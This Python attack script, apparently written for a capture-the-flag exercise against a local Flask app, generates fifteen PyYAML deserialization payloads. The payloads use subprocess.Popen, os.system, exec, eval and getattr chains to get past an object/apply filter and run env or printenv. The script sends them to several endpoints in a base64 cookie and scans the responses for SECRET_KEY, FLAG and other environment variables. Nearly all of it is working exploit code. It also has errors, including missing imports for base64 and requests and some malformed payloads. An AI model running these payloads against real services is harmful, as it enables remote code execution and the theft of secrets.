import time
import re

# Target configuration
TARGET_URL = "http://127.0.0.1:32979"

# Test multiple endpoints
ENDPOINTS = ["/list", "/add", "/about"]

print("[*] Generating PyYAML RCE bypass payloads...")
print("=" * 60)

# Create various PyYAML RCE payloads that bypass !!python/object/apply filter
payloads = []

# Payload 1: Using !!python/object/new with subprocess.Popen
payload1 = """!!python/object/new:subprocess.Popen
- args:
  - /bin/sh
  - -c
  - env > /tmp/env.txt || printenv
  shell: false
"""
payloads.append(("subprocess.Popen (sh -c env)", payload1))

# Payload 2: Using !!python/object/new with os.system
payload2 = """!!python/object/new:os.system
- "env > /tmp/out.txt"
"""
payloads.append(("os.system (env)", payload2))

# Payload 3: Using !!python/object/new with __reduce__ pattern
payload3 = """!!python/object/new:subprocess.Popen
args:
  - ["/bin/sh", "-c", "echo SECRET_KEY=$SECRET_KEY"]
"""
payloads.append(("subprocess.Popen __reduce__", payload3))

# Payload 4: Using module import and function call
payload4 = """!!python/object/new:builtins.exec
- import os; os.system('env > /tmp/pwned.txt')
"""
payloads.append(("builtins.exec", payload4))

# Payload 5: Using compile and eval
payload5 = """!!python/object/new:builtins.eval
- __import__('os').system('printenv')
"""
payloads.append(("builtins.eval os.system", payload5))

# Payload 6: Alternative subprocess format
payload6 = """!!python/object/new:subprocess.Popen
- ["/bin/sh", "-c", "env 2>&1"]
"""
payloads.append(("subprocess.Popen list args", payload6))

# Payload 7: Using getattr to bypass direct import
payload7 = """!!python/object/new:builtins.getattr
- !!python/object/new:builtins.__import__ [os]
- system
- ["env"]
"""
payloads.append(("getattr chain", payload7))

# Payload 8: Using types.FunctionType
payload8 = """!!python/object/new:types.FunctionType
- !!python/tuple
  - !!python/object/new:compile
    - import os; os.system('env')
    - <string>
    - exec
  - !!python/object/new:builtins.globals []
  - os.system
"""
payloads.append(("types.FunctionType compile", payload8))

# Payload 9: Using object.__new__ with __class__ manipulation
payload9 = """!!python/object/new:builtins.type
- SystemCommand
- [!!python/name:builtins.object]
- __init__: !!python/name:os.system
  execute: !!python/name:os.system
"""
payloads.append(("type class creation", payload9))

# Payload 10: Using __reduce_ex__ method
payload10 = """!!python/object/new:__main__.object
state: !!python/tuple
  - !!python/name:os.system
  - env
"""
payloads.append(("reduce_ex pattern", payload10))

# Payload 11: Using yaml.MultiConstructor (if available)
payload11 = """!python/object/apply:subprocess.check_output
- ["/bin/sh", "-c", "env"]
"""
payloads.append(("tag alias check_output", payload11))

# Payload 12: Using full module path
payload12 = """!!python/object/new:subprocess.Popen
args:
  - ["python3", "-c", "import os; print(os.environ)"]
stdout: !!python/object/apply:subprocess.PIPE []
"""
payloads.append(("subprocess.Popen python env print", payload12))

# Payload 13: Using list constructor directly
payload13 = """!!python/object/new:builtins.list
- !!python/object/new:builtins.map
  - !!python/name:builtins.print
  - !!python/object/new:builtins.iter
    - !!python/object/new:__import__ [os]
    - environ
"""
payloads.append(("list/map chain", payload13))

# Payload 14: Using tuple unpacking
payload14 = """!!python/object/new:builtins.tuple
- !!python/object/new:subprocess.Popen
  - ["env"]
"""
payloads.append(("tuple subprocess", payload14))

# Payload 15: Using getattr to access os.environ
payload15 = """!!python/object/new:builtins.print
- !!python/object/new:builtins.getattr
  - !!python/object/new:builtins.__import__ [os]
  - environ
"""
payloads.append(("print getattr os.environ", payload15))

print(f"[*] Generated {len(payloads)} different payloads")
print()

# Function to encode payload to base64 cookie format
def encode_cookie(payload):
    """Encode payload as base64 bookmark cookie value"""
    # Create the bookmark structure with malicious name
    yaml_bytes = payload.encode('utf-8')
    b64_yaml = base64.b64encode(yaml_bytes).decode('utf-8')
    return b64_yaml

# Test each payload
print("[*] Testing payloads against target...")
print()

results = []

for i, (name, payload) in enumerate(payloads, 1):
    print(f"\n[{i}/{len(payloads)}] Testing: {name}")
    print("-" * 60)
    print(f"Payload:\n{payload}")
    print()
    
    # Encode payload
    encoded = encode_cookie(payload)
    print(f"Encoded (first 100 chars): {encoded[:100]}...")
    
    # Create cookies with malicious payload
    cookies = {
        'user': 'f99d00962aa7465fa151128d2318d75d',
        'bookmarks': encoded
    }
    
    # Test on multiple endpoints
    for endpoint in ENDPOINTS:
        url = f"{TARGET_URL}{endpoint}"
        try:
            resp = requests.get(url, cookies=cookies, timeout=10)
            
            print(f"  [{endpoint}] Status: {resp.status_code} | Len: {len(resp.text)}")
            
            # Check for environment variables in response
            env_patterns = [
                r'SECRET_KEY[=:][^\s<>"\']+',
                r'FLAG[=:][^\s<>"\']+',
                r'^[A-Z_]+=.+$',  # Standard env var format
                r'PYTHON',
                r'FLASK',
                r'PATH[=:]',
                r'HOME[=:]',
            ]
            
            found_vars = []
            for pattern in env_patterns:
                matches = re.findall(pattern, resp.text, re.MULTILINE | re.IGNORECASE)
                if matches:
                    found_vars.extend(matches)
            
            if found_vars:
                print(f"  [!] ENV VARIABLES FOUND: {found_vars[:5]}")
            
            # Check if cookie was reset (indicates blocking/validation)
            if 'set-cookie' in resp.headers:
                print(f"  [!] Set-Cookie header present - cookie may be reset")
                print(f"      {resp.headers.get('set-cookie', '')[:100]}")
            
            # Check for error messages
            error_indicators = ['error', 'exception', 'traceback', 'yaml', 'unsafe', 'deserialization']
            if any(ind in resp.text.lower() for ind in error_indicators):
                print(f"  [!] Potential error/exception in response")
                # Print relevant portion
                for line in resp.text.split('\n'):
                    if any(ind in line.lower() for ind in error_indicators):
                        print(f"      > {line[:150]}")
                        break
            
            # Look for command output patterns
            if 'SECRET_KEY' in resp.text or 'PATH=' in resp.text:
                print(f"  [!] POTENTIAL OUTPUT DETECTED")
                # Extract and print interesting portion
                start = resp.text.find('SECRET_KEY')
                if start > -1:
                    snippet = resp.text[start:start+200]
                    print(f"      Snippet: {snippet}")
            
            results.append({
                'payload_name': name,
                'endpoint': endpoint,
                'status': resp.status_code,
                'length': len(resp.text),
                'env_vars': found_vars
            })
            
        except requests.exceptions.Timeout:
            print(f"  [!] TIMEOUT - Possible execution (endpoint: {endpoint})")
            results.append({'payload_name': name, 'endpoint': endpoint, 'status': 'TIMEOUT'})
        except Exception as e:
            print(f"  [!] Error: {e}")
            results.append({'payload_name': name, 'endpoint': endpoint, 'status': f'ERROR: {e}'})

print("\n" + "=" * 60)
print("[*] SUMMARY OF RESULTS")
print("=" * 60)

# Summarize results
timeouts = [r for r in results if r.get('status') == 'TIMEOUT']
successes = [r for r in results if r.get('env_vars')]

if timeouts:
    print(f"\n[!] TIMEOUTS DETECTED ({len(timeouts)}) - May indicate execution:")
    for t in timeouts[:5]:
        print(f"    - {t['payload_name']} on {t['endpoint']}")

if successes:
    print(f"\n[!] ENV VARIABLES FOUND ({len(successes)}):")
    for s in successes:
        print(f"    - {s['payload_name']} on {s['endpoint']}: {s['env_vars'][:3]}")
else:
    print("\n[-] No environment variables extracted")

print(f"\n[*] Total tests: {len(results)}")
print("[*] Payload testing complete")

